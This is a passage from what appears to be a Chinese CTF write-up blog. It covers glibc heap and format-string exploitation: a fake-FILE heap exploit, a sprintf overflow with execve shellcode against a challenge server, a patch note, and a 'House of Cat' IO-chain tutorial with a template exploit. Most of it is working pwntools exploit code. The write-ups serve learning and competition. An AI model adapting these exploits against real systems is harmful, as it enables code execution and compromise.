class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&gt;&gt;<span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i+<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219ce0</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">stderr_addr = libc_addr + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">key = heap_addr </span><br><span class="line">success(<span class="string">&quot;key:&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ptr_addr = libc_addr + 0x2282c0</span></span><br><span class="line"><span class="comment"># success(hex(ptr_addr))</span></span><br><span class="line"><span class="comment"># add(0xf0,p64(key^ptr_addr),&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="comment"># add(0xf0,&#x27;aaaa&#x27;,&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="comment"># success(hex(ptr_addr))</span></span><br><span class="line"><span class="comment"># fake_addr = (heap_addr*0x1000)</span></span><br><span class="line"><span class="comment"># fake_addr += 0x9b0</span></span><br><span class="line"><span class="comment"># dyn_addr = libc_addr + 0x218bc0</span></span><br><span class="line"><span class="comment"># a_addr = libc_addr + 0x265890</span></span><br><span class="line"><span class="comment"># b_addr = libc_addr + 0x2282b0</span></span><br><span class="line"><span class="comment"># add(0xf0,p64(dyn_addr)+p64(fake_addr),p64(a_addr)+p64(b_addr))</span></span><br><span class="line"><span class="comment"># onegadget_addr = libc_addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p64(0)*3 + p64(fake_addr)</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x38,b&#x27;\x00&#x27;)+p64(fake_addr+0x58)+p64(8)+p64(onegadget_addr)</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x100,b&#x27;\x00&#x27;)+p64(fake_addr+0x40)</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x110,b&#x27;\x00&#x27;)+p64(fake_addr+0x48)</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x31c-0x10,b&#x27;\x00&#x27;)+p64(0x1c)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0x100,payload,p64(0))</span></span><br><span class="line"><span class="comment"># success(hex(fake_addr))</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># chunk_addr = (heap_addr*0x1000)+0x7a0</span></span><br><span class="line"></span><br><span class="line">gadget_addr = libc_addr + <span class="number">0x00000000001675b0</span></span><br><span class="line">setcontext_addr = libc_addr + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">rdi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">rsi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>)))</span><br><span class="line">rdx_r12_addr = libc_addr + <span class="number">0x000000000011f497</span></span><br><span class="line">ret_addr = libc_addr + <span class="number">0x0000000000029cd6</span></span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">open_addr = libc_addr + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_addr + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_lock = libc_addr + <span class="number">0x21ba60</span></span><br><span class="line">_IO_wfile_jumps = libc_addr + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">heap_addr = heap_addr *<span class="number">0x1000</span></span><br><span class="line">fake_FILE_addr = heap_addr + <span class="number">0x9d0</span></span><br><span class="line">wide = heap_addr + <span class="number">0xaf0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_FILE = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">fake_FILE += p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">fake_FILE += p64(<span class="number">2</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">fake_FILE += p64(<span class="number">00</span>) + p64(io_lock)</span><br><span class="line">fake_FILE += p64(<span class="number">0xffffffffffffffff</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_FILE += p64(wide) + p64(<span class="number">0</span>)</span><br><span class="line">fake_FILE += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_FILE += p64(<span class="number">1</span>)</span><br><span class="line">fake_FILE += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(_IO_wfile_jumps+<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;aaaa&#x27;</span>, fake_FILE+<span class="string">b&#x27;\n&#x27;</span>) <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">fake_FILE2 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">fake_FILE2 += p64(<span class="number">0</span>)*<span class="number">22</span> + p64(wide+<span class="number">0xe8</span>-<span class="number">0x18</span>)</span><br><span class="line">fake_FILE2 += p64(wide+<span class="number">0xe8</span>-<span class="number">0x18</span>)+p64(system_addr)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;aaaa&#x27;</span>, fake_FILE2+<span class="string">b&#x27;\n&#x27;</span>) <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">IO_list_all = libc_addr + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">add(<span class="number">0xf0</span>, p64(key^IO_list_all),<span class="string">&#x27;1&#x27;</span>) <span class="comment">#12</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#13</span></span><br><span class="line">add(<span class="number">0xf0</span>, p64(fake_FILE_addr),<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#14</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x1212)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="masknote"><a href="#masknote" class="headerlink" title="masknote"></a>masknote</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[0;34mNice to meet you!\n\x1B[0m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[0;32myour name:\x1B[0m&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[0;32mMask:\x1B[0m&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, Mask, <span class="number">0x64</span>uLL);</span><br><span class="line">  check_Mask(Mask);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, Mask, name);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[0;32myour Masked name:\x1B[0m&quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[1;33mWelcome!\n\x1B[0m&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)choice;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来像一道堆题 但是实际是sprintf函数的利用 其如果使用%c可以打印空字符 就存在栈溢出 但是由于不能读入\x00 所以只能覆盖retaddr 由于开局mmap了一个地址 权限是可写可读可执行 所以我们可以往其写入shellcode 随后利用栈溢出修改retaddr</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;175.20.26.208&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Idx:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Idx:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Idx:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;context: &quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Idx:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">io.recvuntil(<span class="string">&quot;your name:&quot;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Mask:&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x401813&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000401392</span></span><br><span class="line"><span class="comment">#0x50a37</span></span><br><span class="line"><span class="comment">#4017A1</span></span><br><span class="line">payload = <span class="string">b&#x27;aa%34$s%126caa&#x27;</span>+<span class="string">b&#x27;\x08\x80\x80\x80&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x2652e0</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&gt;&gt;&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4018EE&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># io.send(&#x27;aaa&#x27;)</span></span><br><span class="line"><span class="comment"># io.recvuntil(&quot;Mask:&quot;)</span></span><br><span class="line"><span class="comment"># onegadget_addr = libc_addr + 0xebd52</span></span><br><span class="line"><span class="comment"># gets_addr = libc_addr + libc.sym[&#x27;gets&#x27;]</span></span><br><span class="line"><span class="comment"># payload = b&#x27;%110caaaaaaaaaaaaaaaaaa&#x27;+cyclic(0x8)+p64(gets_addr)</span></span><br><span class="line"><span class="comment"># # gdb.attach(io,&#x27;b *0x4017FD&#x27;)</span></span><br><span class="line"><span class="comment"># # pause(0)</span></span><br><span class="line"><span class="comment"># io.send(payload)</span></span><br><span class="line"><span class="comment"># # pause()</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4018EE&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line"><span class="comment"># io.sendline(b&#x27;5&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br></pre></td></tr></table></figure><h2 id="dbgnote"><a href="#dbgnote" class="headerlink" title="dbgnote"></a>dbgnote</h2><p>这题fix的关键是溢出 经过代码审计发现有两处地方分别存在2字节溢出和1字节溢出 位于username的读入和chunk size的读入</p><p>将其修改为无溢出即可通过check</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306261229331.png" title="image-20230626122911239" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306261229331.png" alt="image-20230626122911239"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306261230370.png" title="image-20230626123020330" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306261230370.png" alt="image-20230626123020330"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Cat</title>
      <link href="/2023/06/07/House-of-Cat/"/>
      <url>/2023/06/07/House-of-Cat/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2.34以上的版本取消了hook的存在 导致我们getshell的操作只能通过其他办法了 于是house of的链学习就成为了必要 house of cat这条链 只需要一次largebinattack的机会 随后就是伪造io结构 就可以做到劫持程序执行流 诸如setcontext等的利用</p><h2 id="链路分析"><a href="#链路分析" class="headerlink" title="链路分析"></a>链路分析</h2><p>触发io的方式和house of kiwi相似 都是通过assert输出报错 不过还是有所不同 接下来跟着我来分析一下</p><p>截止到__main_assert函数的时候 链路都和house of kiwi一致 这里就不复述了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071940662.png" title="image-20230607194023571" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071940662.png" alt="image-20230607194023571"></a></p><p>不同的是 kiwi是利用fflush触发fake file 本次我们是通过fxprintf中的函数 来实现任意函数调用</p><p>原理是因为vtable虽然在2.24以后加入了检测 但是由于检测不严格 对于一些轻微的偏移可以被无视 所以我们可以修改vtable为其他的表并且加上偏移 就可以实现表内的函数任意调用</p><p>而在这些函数中 会存在一些以寄存器寻址的call指令 利用这一点我们就可以劫持程序执行流</p><p>本次利用的关键就是_IO_wfile_seekoff函数 其内部会调用IO_switch_to_wget_mode函数 该函数内部存在一个可以被我们控制的call指令 </p><p>我们首先利用largebinattack将stderr的地址覆盖为堆地址 随后在堆中伪造结构体 将vtable结构体修改为_IO_wfile_jumps+0x10  这样就可以顺利调用到_IO_wfile_seekoff函数 </p><p>接着回到gdb 我们跟进一下fxprintf函数 一起完整的过一遍链</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071948385.png" title="image-20230607194845339" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071948385.png" alt="image-20230607194845339"></a></p><p>我们还需要进行两次繁琐的函数跳转 随后才能到达利用的关键函数点</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071949732.png" title="image-20230607194918695" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071949732.png" alt="image-20230607194918695"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071950790.png" title="image-20230607195056744" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071950790.png" alt="image-20230607195056744"></a></p><p>这里 就会进入被我们所伪造的vtable表固定的偏移中 在我们上面那样设置的情况下 最后是会调用到_IO_wfile_seekoff函数 我们跟进一下</p><p>可以看到 其内部存在IO_switch_to_wget_mode函数 我们跟进一下</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071952330.png" title="image-20230607195213304" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071952330.png" alt="image-20230607195213304"></a></p><p>这里存在一个可控的call指令 rax的值可以被我们所操控 是写入到stderr上的堆地址固定偏移的一块地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071952818.png" title="image-20230607195245775" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071952818.png" alt="image-20230607195245775"></a></p><p>如果我们在此处地方写入打setcontext用的万能gadget 再搭配上setcontext 就可以做到控制程序执行流</p><p>链路其实是比较清晰的 我们主要是来看一下如何伪造 很多网上的资料其实伪造部分都没有讲清楚</p><h2 id="伪造分析"><a href="#伪造分析" class="headerlink" title="伪造分析"></a>伪造分析</h2><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071955725.png" title="image-20230607195552637" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306071955725.png" alt="image-20230607195552637"></a></p><p>首先我们提供一个完整的fake file构成 我们根据上面所圈出来的框 依次来讲解为什么要如此设定 需要绕过哪些地方 因为授人以鱼不如授人以渔  教会如何利用好动调来伪造结构体才是最重要的  虽然这篇文章也不能让你马上掌握这个能力</p><p>首先是灰框部分 之所以要这样布局 我们先来看前面的这个libc地址 要明白其用意何在 我们首先要定义到需要这个参数的位置 我的办法是直接n 通常会直接卡在某个语句或者触发某个报错 通过这个办法来判断执行到了哪个汇编语句</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072141373.png" title="image-20230607214112329" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072141373.png" alt="image-20230607214112329"></a></p><p>可以看到 是触发了进程的终止 那么这个一般是由于vtable表的检测失败引起的</p><p>为了佐证我们的猜想 我们找到触发检测的函数 随后直接n 看能不能通过这个函数 结果发现不行 印证了猜想 那么我们要想绕过这一点 显然就是靠最近的一次判断 只要不跳转到执行vtable表检测的地方就行了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072142170.png" title="image-20230607214227141" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072142170.png" alt="image-20230607214227141"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072143662.png" title="image-20230607214344636" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072143662.png" alt="image-20230607214344636"></a></p><p>关键的两个寄存器 就是rcx和rax了 rcx最后一次的复制和rax有关系 而rax当时的值是一个相对固定的</p><p>rax最初的值是一个相对固定的 索引到的是一个libc地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072145818.png" title="image-20230607214540799" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072145818.png" alt="image-20230607214540799"></a></p><p>而执行到sub的时候 对应的参数是一个栈上的地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072147683.png" title="image-20230607214732659" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072147683.png" alt="image-20230607214732659"></a></p><p>显然sub后的rax值我们并没有办法改变 那么重点就是放在通过r12来影响rax的值</p><p>注意到最开始r12的赋值语句 和rbp有关系 而rbp的值正是我们的fake file的起始地址 而对应的偏移正是我们所说的灰色部分 但是由于赋值完以后还要减去rdi寄存器的值 所以最后赋值给rax的值最好比较大一点</p><p>接下来 我们根据程序执行流跟进到_IO_wfile_seekoff函数 可以看到要想成功执行到Io_switch_to_wget_mode函数 就需要我们通过上面的cmp判断 rcx和rdx这两个寄存器 分别溯源一下最后一次赋值</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072158957.png" title="image-20230607215836928" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072158957.png" alt="image-20230607215836928"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072238743.png" title="image-20230607223758680" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072238743.png" alt="image-20230607223758680"></a></p><p>和rax有关 而rax为fake file的起始地址 对应的偏移处是我们最开始图片的红框 我们要使得二者的值不一样 才能进入_IO_wfile_seekoff函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072244289.png" title="image-20230607224446247" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072244289.png" alt="image-20230607224446247"></a></p><p>进入_IO_wfile_seekoff  可以看到此时我们就可以进行任意地址call了  对应的偏移是0xe0 对应着我们最开始图片的</p><p>黄框 并且另外一个参数还有作用 这个后面遇到了再讲</p><p>接着就是万能gadget的调用了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072247250.png" title="image-20230607224751228" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072247250.png" alt="image-20230607224751228"></a></p><p>此时rdi的值就是fake file的起始地址 我们需要给其设定对应的值 以此来决定rdx的值 从而控制最后的call</p><p>对应着我们图片中的红框蓝框 我们将其布置好 使得接下来执行setcontext</p><p>然后后面的就是setcontext的利用问题了 这里就不讲了</p><p>没有提到的是紫色框中的参数 这一部分 我们直接将其赋为0  随后n看会卡在哪个地方</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072253308.png" title="image-20230607225320272" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072253308.png" alt="image-20230607225320272"></a></p><p>可以看到会卡在这里 这里是因为rdi+8处不是一个地址 但是这里的cmp又要调用对应地址的内容 所以就无法进行 我们溯源一下 看看rdi的值是怎么得到的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072254569.png" title="image-20230607225424542" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202306072254569.png" alt="image-20230607225424542"></a></p><p>可以看到和rbx有关系 而动调发现rbx的值就是fake file的起始地址 所以在对应地址布置一下就好了</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>首先泄露libc地址和hepa地址 随后利用largebinattaack在stderr写入可控堆块地址用来充当fake file</p><p>随后布置好结构体 利用top chunk或者largebin chunk来触发io链 最后orw</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x420</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21a0b0</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">success(<span class="string">&quot;Heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">stderr_addr = libc_addr + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stderr_addr-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">gadget_addr = libc_addr + <span class="number">0x0000000000165fa0</span></span><br><span class="line">setcontext_addr = libc_addr + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">rdi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">rsi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>)))</span><br><span class="line">rdx_addr = libc_addr + <span class="number">0x000000000005f65a</span></span><br><span class="line">ret_addr = libc_addr + <span class="number">0x0000000000028a87</span></span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span 